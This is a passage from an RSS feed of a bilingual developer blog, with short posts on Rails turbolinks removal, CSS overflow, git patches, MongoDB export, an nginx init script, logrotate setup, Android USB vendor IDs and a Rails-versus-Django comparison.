      <pubDate>Fri, 29 Nov 2013 01:48:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/disable-your-sound-settings-to-save-android-battery</link>
    </item>
    <item>
      <title>如何从现有项目中提取出新项目(how to extract new project from existing one )</title>
      <description>&lt;p&gt;步骤非常简单： (quite simple if following the steps below: )&lt;/p&gt;
&lt;p&gt;1. $ copy &amp;lt;old_project&amp;gt; &amp;lt;new_project&amp;gt; -r &amp;#160; &amp;#160; &amp;#160; &amp;#160; 。 &amp;#160;把老项目复制一份。（copy the old project )&amp;#160;&lt;/p&gt;
&lt;p&gt;2. 把无用的文件从老项目中删除！ &amp;#160; （ remove redundant files from the new_project. &amp;#160; &amp;#160; ）&lt;/p&gt;
&lt;p&gt;实践证明： 复制老项目，删除无用文件 这个步骤是最省时省力的！ 绝对不要 根据现有项目，摘取 功能点，然后再写新项目。 累死&lt;/p&gt;
&lt;p&gt;（ this is my best practise, never &amp;amp; ever try to extract the functions from old project and then re-implement them in a new project ( or copy the files to the new project ) )&amp;#160;&lt;/p&gt;</description>
      <pubDate>Sat, 23 Nov 2013 07:02:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/how-to-extract-new-project-from-existing-one</link>
    </item>
    <item>
      <title>Rails 4 取消turbolinks ( remove turbolinks from Rails 4)</title>
      <description>&lt;p&gt;turbolinks 的作用是为了加快js的加载。把它放到了cache中。 &amp;#160; ( it's said that using turbolink makes your browser loading js/css faster)&amp;#160;&lt;/p&gt;
&lt;p&gt;我觉得很不爽，很多时候都会使我的JS出现莫名其妙的问题。 &amp;#160; ( but I don't like it since it makes me lots of wired problems )&lt;/p&gt;
&lt;p&gt;有了angular, 我们要 turbolink干什么？ 直接干掉！ ( so lets remove it from our Rails 4 since we haveAngular already ~ :))&amp;#160;&lt;/p&gt;
&lt;p&gt;refer to : 参考文章：&amp;#160; &lt;a href="http://blog.steveklabnik.com/posts/2013-06-25-removing-turbolinks-from-rails-4"&gt; this post
&lt;/a&gt;
&lt;/p&gt;
&lt;p&gt;1. Remove the gem 'turbolinks' line from your Gemfile.&lt;/p&gt;
&lt;p&gt;2. Remove the //= require turbolinks from your app/assets/javascripts/application.js.
&lt;/p&gt;
&lt;p&gt;3. In your application.html.erb (layout file), change the js declaration:&amp;#160;&lt;/p&gt;
&lt;p&gt;&amp;#160;&amp;lt;%= javascript_include_tag "application", "data-turbolinks-track" =&amp;gt; true %&amp;gt; 
 to&lt;/p&gt;
&lt;p&gt;&amp;#160;&amp;lt;%= javascript_include_tag "application" %&amp;gt; 
&lt;/p&gt;
&lt;p&gt;That's it. Prost! :)
&lt;/p&gt;</description>
      <pubDate>Sun, 17 Nov 2013 11:12:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/remove-turbolinks-from-rails4</link>
    </item>
    <item>
      <title>CSS中的over flow. ( overflow in CSS layout) </title>
      <description>&lt;p&gt;最近几天遇到一个问题： 如何实现土豆客户端中的预览。 ( these day I met a problem: I can't make a div's content scroll-x )&lt;/p&gt;
&lt;p&gt;如图： &amp;#160; &amp;#160; （略）&lt;/p&gt;
&lt;p&gt;实际效果确实这样： &amp;#160;（图）&lt;/p&gt;
&lt;p&gt;后来反思了一下，发现 这样的代码是可以正常工作的： &amp;#160; ( after thinking for a day, I found the code below works! )&lt;/p&gt;
&lt;pre&gt;    &lt;div style="width:200px; height: 200px; border: 1px solid red; scroll:true;
        overflow-x: scroll; "&gt; Parent Div
      &lt;div style="width: 300px ; height: 100px; border : 2px solid blue; float: left"&gt;Float Sub Div&lt;/div&gt;
      &lt;div style="width: 300px ; height: 100px; border : 2px solid blue; float: left"&gt;Float Sub Div&lt;/div&gt;
    &lt;/div&gt;
&lt;/pre&gt;
&lt;p&gt; 所以问题的关键在于： 要让 Sub Div 的 宽度 大于 Parent Div 的宽度！ 就可以了！ &amp;#160;( so the key is: make sure the "sub div"'s width is greater than parent div's width.&amp;#160;&lt;/p&gt; 
&lt;p&gt;(对于土豆客户端，最后我的解决方案是，把所有的div 放到一个大table中去。 这样 大table做为 子div就会使parent div呈现 overflow的状态 &amp;#160;( and for the solution of my case, I used a 'table' to wrap all the subdivs and then put this table to parent div. everything is ok now)&amp;#160;&lt;/p&gt;</description>
      <pubDate>Sun, 17 Nov 2013 05:43:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/overflow-in-css-layout</link>
    </item>
    <item>
      <title>git patch/apply 某一个commit  ( apply a patch generated from a specific commit ) </title>
      <description>&lt;p&gt;如何在另外一个机器上 apply某个 path？ &amp;#160;&lt;/p&gt;
&lt;p&gt;我们遇到一个情况， 在某个机器上，需要一个紧急部署，但是又不希望手工去修改（因为已经有了一个commit 了）。这样的情况下，可以使用git path 专门为某个commit 生成patch, 然后在这个远程机器上apply it. &amp;#160;(&amp;#160;apply a patch generated from a specific commit ?)&lt;/span&gt;
&lt;/p&gt;&lt;p&gt;$ git format-patch -1 &amp;lt;sha&amp;gt; &amp;#160; # =&amp;gt; &amp;#160;0001__.patch&lt;/p&gt;
&lt;p&gt;$ git apply &amp;lt;path_file&amp;#160;&amp;gt;&lt;/p&gt;
&lt;p&gt;see:&amp;#160;&lt;a href="http://stackoverflow.com/questions/6658313/generate-a-git-patch-for-a-specific-commit" title="http://stackoverflow.com/questions/6658313/generate-a-git-patch-for-a-specific-commit" target="_blank"&gt;http://stackoverflow.com/questions/6658313/generate-a-git-patch-for-a-specific-commit&lt;/a&gt;
&lt;/p&gt;</description>
      <pubDate>Thu, 14 Nov 2013 10:57:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/apply-a-patch-generated-from-a-specific-commit</link>
    </item>
    <item>
      <title>使用mongoexport 按条件导出数据 (export mongo database by search conditions)</title>
      <description>&lt;p&gt;referred post: &lt;a href="http://www.glenscott.co.uk/blog/exporting-a-single-document-from-mongodb/" target="_blank"&gt;http://www.glenscott.co.uk/blog/exporting-a-single-document-from-mongodb/&lt;/a&gt; 
&lt;/p&gt;
&lt;p&gt;简单的说： (long in short)&amp;#160;&lt;/p&gt;
&lt;p&gt;导出： &amp;#160;/ export:&amp;#160;&lt;/p&gt;
&lt;p&gt;$ mongoexport -d 'm_video_fetcher_production' -c 'plans' -q '{cms_category_class: /IphoneSubChannel/}' -o ios_sub_channel_plans.js -p&lt;/p&gt;
&lt;p&gt;导入： / import&amp;#160;&lt;/p&gt;
&lt;p&gt;$ mongoimport -p -d 'm_video_fetcher_real_production' -c 'plans' ios_sub_channel_plans.js&lt;/p&gt;</description>
      <pubDate>Thu, 14 Nov 2013 08:16:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/export-import-data-by-certain-condition</link>
    </item>
    <item>
      <title>hosting on godaddy.  </title>
      <description>&lt;p&gt;简单到无法想象&amp;#160;&amp;#160; so simple. &lt;/p&gt;

&lt;p&gt;80端口被封，只好放弃花生壳。&amp;#160;&amp;#160; 80port was blocked in China mainland, since&amp;#160; this July &lt;/p&gt;
&lt;p&gt;国内主机不考虑，&amp;#160; I won't consider the virtual hosts in China. &lt;/p&gt;
&lt;p&gt;国外的heroku人气很高，，上去一看，完全跟传统的SSH 操作不一样。所有的功能都成了service， 我需要一个一个的学习addon, plugin...&amp;#160; command line. ...天啊。 Heroku is popular, but for me, it's not the same way that I did as in other linux hosts. I have to learn those services and plugins one by one....&lt;/p&gt;
&lt;p&gt;看了下godaddy,&amp;#160; 一个月才40美刀不到，太便宜了。果断买之~~~~&amp;#160;&amp;#160;&amp;#160; so I switched to godaddy,&amp;#160; 40 dollars per month. &lt;/p&gt;
&lt;p&gt;需要开通SSH服务， 只需要输入你的电话号码，对方马上自动电话过来，告知一个PIN密码。就可以用了&amp;#160;&amp;#160; once you gave your phone number to godaddy, it will give you a PIN number via a phone call. &lt;/p&gt;

&lt;p&gt;让我试一试。。。之后再奉上经验。&lt;/p&gt;</description>
      <pubDate>Sun, 10 Nov 2013 10:33:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/hosting-in-godaddy</link>
    </item>
    <item>
      <title>对日志的压缩和处理 ( gzip, zgrep log files ) </title>
      <description>&lt;p&gt;1. compress a file: &amp;#160;$ gzip &amp;lt;file_name&amp;gt;&amp;#160;&lt;/p&gt;
&lt;p&gt;2. search a regex from a zipped file : &amp;#160;$ zgrep "abc" some_file.gz&lt;/p&gt;</description>
      <pubDate>Thu, 27 Jun 2013 06:29:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/gzip-and-zgrep-log-files</link>
    </item>
    <item>
      <title>setup nginx as a service in linux ( 把nginx设置成自动启动 ) </title>
      <description>&lt;p&gt;refer to:&amp;#160;&lt;a href="http://articles.slicehost.com/2007/10/17/ubuntu-lts-adding-an-nginx-init-script"&gt;http://articles.slicehost.com/2007/10/17/ubuntu-lts-adding-an-nginx-init-script&lt;/a&gt;
&lt;/p&gt;
&lt;div class="article"&gt;

  &lt;h1&gt;&lt;a href="/2007/10/17/ubuntu-lts-adding-an-nginx-init-script" title="Ubuntu LTS - adding an nginx init script"&gt;Ubuntu LTS - adding an nginx init script&lt;/a&gt;
&lt;/h1&gt; 
    
      &lt;p&gt;In the &lt;a href="http://articles.slicehost.com/2007/10/16/ubuntu-lts-installing-nginx" title="Ubuntu LTS - installing nginx"&gt;previous article&lt;/a&gt; we installed nginx from source. However, installing from source does not create an init script.&lt;/p&gt;

&lt;p&gt;Let's create such a script so we can easily start, stop and restart nginx and, perhaps more importantly, ensure it automatically starts on a reboot.&lt;/p&gt;

      &lt;hr /&gt;

      
    
    

      &lt;h3&gt;Assumption&lt;/h3&gt;

&lt;p&gt;I am assuming you have installed nginx from source using the options shown in the &lt;a href="http://articles.slicehost.com/2007/10/16/ubuntu-lts-installing-nginx" title="Ubuntu LTS - installing nginx"&gt;previous article&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;If you have used other options or have place the nginx binary in a directory other than /usr/local/sbin/ then you may need to adjust the script shown below.&lt;/p&gt;

&lt;h3&gt;Stop&lt;/h3&gt;

&lt;p&gt;If you have nginx running then stop the process using:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;sudo kill `cat /usr/local/nginx/logs/nginx.pid`&lt;/code&gt;
&lt;/pre&gt;

&lt;h3&gt;Init script&lt;/h3&gt;

&lt;p&gt;The script shown below is from an Ubuntu Feisty install and has been adapted to take into account our custom install of nginx.&lt;/p&gt;

&lt;p&gt;Let's go ahead and create the script:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;sudo nano /etc/init.d/nginx&lt;/code&gt;
&lt;/pre&gt;

&lt;p&gt;Inside the blank file place the following:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;#! /bin/sh

### BEGIN INIT INFO
# Provides:          nginx
# Required-Start:    $all
# Required-Stop:     $all
# Default-Start:     2 3 4 5
# Default-Stop:      0 1 6
# Short-Description: starts the nginx web server
# Description:       starts nginx using start-stop-daemon
### END INIT INFO


PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
DAEMON=/usr/local/sbin/nginx
NAME=nginx
DESC=nginx

test -x $DAEMON || exit 0

# Include nginx defaults if available
if [ -f /etc/default/nginx ] ; then
        . /etc/default/nginx
fi

set -e

case "$1" in
  start)
        echo -n "Starting $DESC: "
        start-stop-daemon --start --quiet --pidfile /usr/local/nginx/logs/$NAME.pid \
                --exec $DAEMON -- $DAEMON_OPTS
        echo "$NAME."
        ;;
  stop)
        echo -n "Stopping $DESC: "
        start-stop-daemon --stop --quiet --pidfile /usr/local/nginx/logs/$NAME.pid \
                --exec $DAEMON
        echo "$NAME."
        ;;
  restart|force-reload)
        echo -n "Restarting $DESC: "
        start-stop-daemon --stop --quiet --pidfile \
                /usr/local/nginx/logs/$NAME.pid --exec $DAEMON
        sleep 1
        start-stop-daemon --start --quiet --pidfile \
                /usr/local/nginx/logs/$NAME.pid --exec $DAEMON -- $DAEMON_OPTS
        echo "$NAME."
        ;;
  reload)
      echo -n "Reloading $DESC configuration: "
      start-stop-daemon --stop --signal HUP --quiet --pidfile /usr/local/nginx/logs/$NAME.pid \
          --exec $DAEMON
      echo "$NAME."
      ;;
  *)
        N=/etc/init.d/$NAME
        echo "Usage: $N {start|stop|restart|force-reload}" &amp;gt;&amp;amp;2
        exit 1
        ;;
esac

exit 0&lt;/code&gt;
&lt;/pre&gt;

&lt;p&gt;You can also download the script from &lt;a href="http://articles.slicehost.com/assets/2007/10/17/nginx" title="Nginx Init Script"&gt;here&lt;/a&gt; (as it's a shell script, you may get a warning about it being a 'BIN' file, just save as normal and open in any text editor).&lt;/p&gt;

&lt;p&gt;There's not really the space to go into the workings of the script but suffice to say, it defines where the main nginx binary is located so nginx can be started correctly.&lt;/p&gt;

&lt;p&gt;It also defines where to find the nginx.pid file so the process and be correctly stopped and restarted.&lt;/p&gt;

&lt;h3&gt;Execute&lt;/h3&gt;

&lt;p&gt;As the init file is a shell script, it needs to have executable permissions.&lt;/p&gt;

&lt;p&gt;We set them like so:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;sudo chmod +x /etc/init.d/nginx&lt;/code&gt;
&lt;/pre&gt;

&lt;h3&gt;update-rc&lt;/h3&gt;

&lt;p&gt;Now we have the base script prepared, we need to add it to the default run levels:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;sudo /usr/sbin/update-rc.d -f nginx defaults&lt;/code&gt;
&lt;/pre&gt;

&lt;p&gt;The output will be similar to this:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;Adding system startup for /etc/init.d/nginx ...
   /etc/rc0.d/K20nginx -&amp;gt; ../init.d/nginx
   /etc/rc1.d/K20nginx -&amp;gt; ../init.d/nginx
   /etc/rc6.d/K20nginx -&amp;gt; ../init.d/nginx
   /etc/rc2.d/S20nginx -&amp;gt; ../init.d/nginx
   /etc/rc3.d/S20nginx -&amp;gt; ../init.d/nginx
   /etc/rc4.d/S20nginx -&amp;gt; ../init.d/nginx
   /etc/rc5.d/S20nginx -&amp;gt; ../init.d/nginx&lt;/code&gt;
&lt;/pre&gt;

&lt;p&gt;Done.&lt;/p&gt;

&lt;h3&gt;Start, Stop and Restart&lt;/h3&gt;

&lt;p&gt;Now we can start, stop and restart nginx just as with any other service:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;sudo /etc/init.d/nginx start
...
sudo /etc/init.d/nginx stop
...
sudo /etc/init.d/nginx restart&lt;/code&gt;
&lt;/pre&gt;

&lt;p&gt;The script will also be called on a reboot so nginx will automatically start.&lt;/p&gt;

&lt;h3&gt;Summary&lt;/h3&gt;

&lt;p&gt;Adding a process to the run levels like this saves a lot of frustration and effort, not only in manually starting and stopping the process, but it having it automatically start on a reboot.&lt;/p&gt;

&lt;p&gt;PickledOnion.&lt;/p&gt;
    
&lt;/div&gt;


</description>
      <pubDate>Sat, 15 Jun 2013 01:00:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/make-nginx-a-service-in-ubuntu</link>
    </item>
    <item>
      <title>ubuntu下手机截图(使用adb, DDM )  (capture your android device in linux)</title>
      <description>&lt;p&gt;see:&amp;#160; &lt;a href="https://help.ubuntu.com/community/AndroidScreenshots"&gt;https://help.ubuntu.com/community/AndroidScreenshots&lt;/a&gt; and &lt;a href="http://stackoverflow.com/questions/6318597/no-device-list-in-android-ddms"&gt;http://stackoverflow.com/questions/6318597/no-device-list-in-android-ddms&lt;/a&gt;
&lt;/p&gt;
&lt;p&gt;the key process: &amp;#160;make clear about your cell phone's vendor, e.g. Motorola is: &amp;#160; 22b8&amp;#160;&lt;/p&gt;
&lt;table&gt;
  &lt;tbody&gt;&lt;tr&gt;
    &lt;th&gt;Company&lt;/th&gt;
&lt;th&gt;USB Vendor ID&lt;/th&gt;
&lt;/tr&gt;
  &lt;tr&gt;
    &lt;td&gt;Acer&lt;/td&gt;
    &lt;td&gt;&lt;code&gt;0502&lt;/code&gt;
&lt;/td&gt;
  &lt;/tr&gt;
  &lt;tr&gt;
    &lt;td&gt;ASUS&lt;/td&gt;
    &lt;td&gt;&lt;code&gt;0b05&lt;/code&gt;
&lt;/td&gt;
  &lt;/tr&gt;
  &lt;tr&gt;
    &lt;td&gt;Dell&lt;/td&gt;
    &lt;td&gt;&lt;code&gt;413c&lt;/code&gt;
&lt;/td&gt;
  &lt;/tr&gt;
  &lt;tr&gt;
    &lt;td&gt;Foxconn&lt;/td&gt;
    &lt;td&gt;&lt;code&gt;0489&lt;/code&gt;
&lt;/td&gt;
  &lt;/tr&gt;
  &lt;tr&gt;
    &lt;td&gt;Fujitsu&lt;/td&gt;
    &lt;td&gt;&lt;code&gt;04c5&lt;/code&gt;
&lt;/td&gt;
  &lt;/tr&gt;
  &lt;tr&gt;
    &lt;td&gt;Fujitsu Toshiba&lt;/td&gt;
    &lt;td&gt;&lt;code&gt;04c5&lt;/code&gt;
&lt;/td&gt;
  &lt;/tr&gt;
  &lt;tr&gt;
    &lt;td&gt;Garmin-Asus&lt;/td&gt;
    &lt;td&gt;&lt;code&gt;091e&lt;/code&gt;
&lt;/td&gt;
  &lt;/tr&gt;
  &lt;tr&gt;
    &lt;td&gt;Google&lt;/td&gt;
    &lt;td&gt;&lt;code&gt;18d1&lt;/code&gt;
&lt;/td&gt;
  &lt;/tr&gt;
  &lt;tr&gt;
    &lt;td&gt;Haier&lt;/td&gt;
    &lt;td&gt;&lt;code&gt;201E&lt;/code&gt;
&lt;/td&gt;
  &lt;/tr&gt;
  &lt;tr&gt;
    &lt;td&gt;Hisense&lt;/td&gt;
    &lt;td&gt;&lt;code&gt;109b&lt;/code&gt;
&lt;/td&gt;
  &lt;/tr&gt;
  &lt;tr&gt;
    &lt;td&gt;HTC&lt;/td&gt;
    &lt;td&gt;&lt;code&gt;0bb4&lt;/code&gt;
&lt;/td&gt;
  &lt;/tr&gt;
  &lt;tr&gt;
    &lt;td&gt;Huawei&lt;/td&gt;
    &lt;td&gt;&lt;code&gt;12d1&lt;/code&gt;
&lt;/td&gt;
  &lt;/tr&gt;
  &lt;tr&gt;
    &lt;td&gt;K-Touch&lt;/td&gt;
    &lt;td&gt;&lt;code&gt;24e3&lt;/code&gt;
&lt;/td&gt;
  &lt;/tr&gt;
  &lt;tr&gt;
    &lt;td&gt;KT Tech&lt;/td&gt;
    &lt;td&gt;&lt;code&gt;2116&lt;/code&gt;
&lt;/td&gt;
  &lt;/tr&gt;
  &lt;tr&gt;
    &lt;td&gt;Kyocera&lt;/td&gt;
    &lt;td&gt;&lt;code&gt;0482&lt;/code&gt;
&lt;/td&gt;
  &lt;/tr&gt;
  &lt;tr&gt;
    &lt;td&gt;Lenovo&lt;/td&gt;
    &lt;td&gt;&lt;code&gt;17ef&lt;/code&gt;
&lt;/td&gt;
  &lt;/tr&gt;
  &lt;tr&gt;
    &lt;td&gt;LG&lt;/td&gt;
    &lt;td&gt;&lt;code&gt;1004&lt;/code&gt;
&lt;/td&gt;
  &lt;/tr&gt;
  &lt;tr&gt;
    &lt;td&gt;Motorola&lt;/td&gt;
    &lt;td&gt;&lt;code&gt;22b8&lt;/code&gt;
&lt;/td&gt;
  &lt;/tr&gt;
  &lt;tr&gt;
    &lt;td&gt;MTK&lt;/td&gt;
    &lt;td&gt;&lt;code&gt;0e8d&lt;/code&gt;
&lt;/td&gt;
  &lt;/tr&gt;
  &lt;tr&gt;
    &lt;td&gt;NEC&lt;/td&gt;
    &lt;td&gt;&lt;code&gt;0409&lt;/code&gt;
&lt;/td&gt;
  &lt;/tr&gt;
  &lt;tr&gt;
    &lt;td&gt;Nook&lt;/td&gt;
    &lt;td&gt;&lt;code&gt;2080&lt;/code&gt;
&lt;/td&gt;
  &lt;/tr&gt;
  &lt;tr&gt;
    &lt;td&gt;Nvidia&lt;/td&gt;
    &lt;td&gt;&lt;code&gt;0955&lt;/code&gt;
&lt;/td&gt;
  &lt;/tr&gt;
  &lt;tr&gt;
    &lt;td&gt;OTGV&lt;/td&gt;
    &lt;td&gt;&lt;code&gt;2257&lt;/code&gt;
&lt;/td&gt;
  &lt;/tr&gt;
  &lt;tr&gt;
    &lt;td&gt;Pantech&lt;/td&gt;
    &lt;td&gt;&lt;code&gt;10a9&lt;/code&gt;
&lt;/td&gt;
  &lt;/tr&gt;
  &lt;tr&gt;
    &lt;td&gt;Pegatron&lt;/td&gt;
    &lt;td&gt;&lt;code&gt;1d4d&lt;/code&gt;
&lt;/td&gt;
  &lt;/tr&gt;
  &lt;tr&gt;
    &lt;td&gt;Philips&lt;/td&gt;
    &lt;td&gt;&lt;code&gt;0471&lt;/code&gt;
&lt;/td&gt;
  &lt;/tr&gt;
  &lt;tr&gt;
    &lt;td&gt;PMC-Sierra&lt;/td&gt;
    &lt;td&gt;&lt;code&gt;04da&lt;/code&gt;
&lt;/td&gt;
  &lt;/tr&gt;
  &lt;tr&gt;
    &lt;td&gt;Qualcomm&lt;/td&gt;
    &lt;td&gt;&lt;code&gt;05c6&lt;/code&gt;
&lt;/td&gt;
  &lt;/tr&gt;
  &lt;tr&gt;
    &lt;td&gt;SK Telesys&lt;/td&gt;
    &lt;td&gt;&lt;code&gt;1f53&lt;/code&gt;
&lt;/td&gt;
  &lt;/tr&gt;
  &lt;tr&gt;
    &lt;td&gt;Samsung&lt;/td&gt;
    &lt;td&gt;&lt;code&gt;04e8&lt;/code&gt;
&lt;/td&gt;
  &lt;/tr&gt;
  &lt;tr&gt;
    &lt;td&gt;Sharp&lt;/td&gt;
    &lt;td&gt;&lt;code&gt;04dd&lt;/code&gt;
&lt;/td&gt;
  &lt;/tr&gt;
  &lt;tr&gt;
    &lt;td&gt;Sony&lt;/td&gt;
    &lt;td&gt;&lt;code&gt;054c&lt;/code&gt;
&lt;/td&gt;
  &lt;/tr&gt;
  &lt;tr&gt;
    &lt;td&gt;Sony Ericsson&lt;/td&gt;
    &lt;td&gt;&lt;code&gt;0fce&lt;/code&gt;
&lt;/td&gt;
  &lt;/tr&gt;
  &lt;tr&gt;
    &lt;td&gt;Teleepoch&lt;/td&gt;
    &lt;td&gt;&lt;code&gt;2340&lt;/code&gt;
&lt;/td&gt;
  &lt;/tr&gt;
  &lt;tr&gt;
    &lt;td&gt;Toshiba&lt;/td&gt;
    &lt;td&gt;&lt;code&gt;0930&lt;/code&gt;
&lt;/td&gt;
  &lt;/tr&gt;
  &lt;tr&gt;
    &lt;td&gt;ZTE&lt;/td&gt;
    &lt;td&gt;&lt;code&gt;19d2&lt;/code&gt;
&lt;/td&gt;
  &lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;</description>
      <pubDate>Fri, 14 Jun 2013 02:55:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/capture-android-device-in-linux</link>
    </item>
    <item>
      <title>使用logrotate 为nginx日志 分卷 (rotate the nginx logs ) </title>
      <description>&lt;p&gt;see:&amp;#160; &lt;a href="http://serverfault.com/questions/284729/nginx-log-rotation"&gt;http://serverfault.com/questions/284729/nginx-log-rotation&lt;/a&gt;
&lt;/p&gt;
&lt;p&gt;1. locate your Nginx pid file: &amp;#160; ( normally it's at: &amp;#160;/opt/nginx/logs/nginx.pid &amp;#160;in my Ubuntu) &lt;/p&gt;
&lt;p&gt;2. you should know this key process: &amp;#160;&lt;/p&gt;
&lt;pre&gt;# this just simply make nginx start a new log file, but NOT restart.  ( quite fast)
kill -USR1 `cat /opt/nginx/logs/nginx.pid`
&lt;/pre&gt;
&lt;p&gt;3. create a new file (/etc/logrotate.d/nginx) &amp;#160;containing this :&amp;#160;&lt;/p&gt;
&lt;pre&gt;# nginx SIGUSR1: Re-opens the log files.
"/opt/nginx/logs/access.log" "/opt/nginx/logs/error.log"{
  daily
  rotate 7
  dateext
  copytruncate
  missingok
  notifempty
  delaycompress
  sharedscripts
  postrotate
    test ! -f /opt/nginx/logs/nginx.pid || kill -USR1 `cat /opt/nginx/logs/nginx.pid`
  endscript
}&lt;/pre&gt;
&lt;p&gt;4. 记住： logrotate 运行时，是有一个自己的状态记录文件的。( /var/lib/logrotate.status ) 它会在这个文件中记录好每个文件的最早时间。然后每次运行时把目标文件跟自己的表做对比。如果发现目标文件的日期超过了这个表的日期，比如一个星期，那么 logrotate 才会对它分卷。 &amp;#160;( keep in mind that logrotate has its own status file which is used to remember when the target file is created and determine if the target file should be rotated. &amp;#160;)&amp;#160;
&lt;/p&gt;
&lt;p&gt;5. 典型命令： &amp;#160;$logrotate -v /etc/logrotate.d/nginx &amp;#160; (如果你使用了 -vd 那么就仅仅是一个dry-run 预演，不会对 /var/lib/logrotate.status 生效 ) ( also remember that don't use the debug mode since it's just lead to a dry-run result and won't take effect on /var/lib/logrotate.status file )&amp;#160;&lt;/p&gt;
&lt;p&gt;6. 把logrotate增加到你的 crontab中去。 &amp;#160;(make it affect via crontab -e)&amp;#160;&lt;/p&gt;
&lt;pre&gt;例如：
# in crontab editor: 
0 0 * * * logrotate -v /etc/logrotate.conf
&lt;/pre&gt;
&lt;p&gt;p.s. 所以，想要你的改动立即生效的话，&lt;/p&gt;
&lt;p&gt;1. 先运行logrotate : $&amp;#160; logrotate -v /etc/logrotate.d/nginx 
&lt;/p&gt;

2. 编辑 vim /var/lib/logrotate.status
把里面对应的内容，改成昨天。&lt;div&gt;例如："/usr/local/nginx/logs/access.log" 2013-12-22&amp;#160;&lt;/div&gt;
&lt;div&gt;&amp;#160;要改成： "/usr/local/nginx/logs/access.log" 2013-12-21&amp;#160;&lt;/div&gt;
&lt;div&gt;3. 再运行： logrotate -v /etc/logrotate.d/nginx &lt;/div&gt;</description>
      <pubDate>Fri, 14 Jun 2013 00:41:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/rotate-ngin-logs</link>
    </item>
    <item>
      <title>from Rails to Django (vice versa) 从Rails 到Django （反之亦然）</title>
      <description>&lt;p&gt;checkout this post: &amp;#160;&amp;#160; &lt;a href="http://blog.jupo.org/2011/07/30/rails-quick-start-for-djangonauts/"&gt;http://blog.jupo.org/2011/07/30/rails-quick-start-for-djangonauts/&lt;/a&gt;
&lt;/p&gt;
&lt;div class="container main"&gt;&lt;h6&gt;July 30, 2011 &amp;#160;/&amp;#160; &lt;a href="/"&gt;Home&lt;/a&gt;
&lt;/h6&gt;
&lt;p&gt;I recently started a new role at a &lt;a href="http://rubyonrails.org/"&gt;Ruby on Rails&lt;/a&gt; shop, which as a long time &lt;a href="https://www.djangoproject.com/"&gt;Django&lt;/a&gt; specialist was a really interesting opportunity. There’s a lot of competition between the two frameworks’ communities, ranging from friendly rivalry and respectful admiration at the mature end of the scale, to all out fanboy fuelled flame-wars at the other.&lt;/p&gt;

&lt;p&gt;After you wade through the rivalry, the common wisdom voiced is that they’re conceptually the same. If you know &lt;a href="http://python.org/"&gt;Python&lt;/a&gt;, go with Django and if you know &lt;a href="http://www.ruby-lang.org/"&gt;Ruby&lt;/a&gt;, go with Rails. After spending several months with Rails I can attest to this being true. At a bird’s-eye view both frameworks contain almost identical concepts, implemented with different philosophies stemming from the ideals expressed by the languages they’re written in. Both frameworks provide a vastly superior approach to security, modularity and rapid development than &lt;a href="/2010/09/28/on-modern-web-development/"&gt;their predecessors do&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;An interesting question to ask would be: &lt;em&gt;which would be the best framework to choose, not knowing either language?&lt;/em&gt; It would be naive of me to believe I am unbiased, but I would certainly recommend Django over Rails. The relative strictness of Python and explicitness of each component in Django, compared to the implicit magic in Rails, is simply much more geared towards creating large-scale systems in a sane and transparent way. To Ruby’s credit though, I have developed a real admiration for the language itself, and have continued using it in my own projects - but that’s a topic for another post.&lt;/p&gt;

&lt;p&gt;Considering how similar the two frameworks are component-wise, one thing I did miss was a side-by-side cheat sheet for working out what each of the concepts were in Rails that I already knew well in Django. I’ve put one together below to help out anyone who might be picking up either framework while already knowing the other. For clarity, I’ve also included descriptions of each type of component, for those who haven’t used either framework.&lt;/p&gt;

&lt;table class="table table-striped"&gt;
&lt;tbody&gt;&lt;tr&gt;
    &lt;th&gt;Django&lt;/th&gt;
    &lt;th&gt;Ruby on Rails&lt;/th&gt;
    &lt;th&gt;&amp;#160;&lt;/th&gt;
&lt;/tr&gt;
&lt;tr&gt;
    &lt;td&gt;&lt;a href="https://docs.djangoproject.com/en/dev/topics/http/urls/"&gt;URL patterns&lt;/a&gt;
&lt;/td&gt;
    &lt;td&gt;&lt;a href="http://guides.rubyonrails.org/routing.html"&gt;Routes&lt;/a&gt;
&lt;/td&gt;
    &lt;td&gt;Regular expression definitions for each type of URL and what part of the web site they map to.&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
    &lt;td&gt;&lt;a href="https://docs.djangoproject.com/en/dev/topics/http/views/"&gt;Views&lt;/a&gt;
&lt;/td&gt;
    &lt;td&gt;&lt;a href="http://guides.rubyonrails.org/action_controller_overview.html"&gt;Controllers&lt;/a&gt;
&lt;/td&gt;
    &lt;td&gt;The units of code that the above regular expressions map to, that perform application logic and pass data to a rendering layer.&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
    &lt;td&gt;&lt;a href="https://docs.djangoproject.com/en/dev/topics/templates/"&gt;Templates&lt;/a&gt;
&lt;/td&gt;
    &lt;td&gt;&lt;a href="http://guides.rubyonrails.org/layouts_and_rendering.html"&gt;Views&lt;/a&gt;
&lt;/td&gt;
    &lt;td&gt;The rendering layer that is given data from the code described above, and performs display logic typically wrapped around HTML code.&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
    &lt;td&gt;&lt;a href="https://docs.djangoproject.com/en/dev/ref/templates/builtins/"&gt;Template tags&lt;/a&gt; &lt;em&gt;(built-in)&lt;/em&gt;
&lt;/td&gt;
    &lt;td&gt;&lt;a href="http://www.ruby-doc.org/stdlib-1.9.3/libdoc/erb/rdoc/ERB.html"&gt;Embedded Ruby&lt;/a&gt;
&lt;/td&gt;
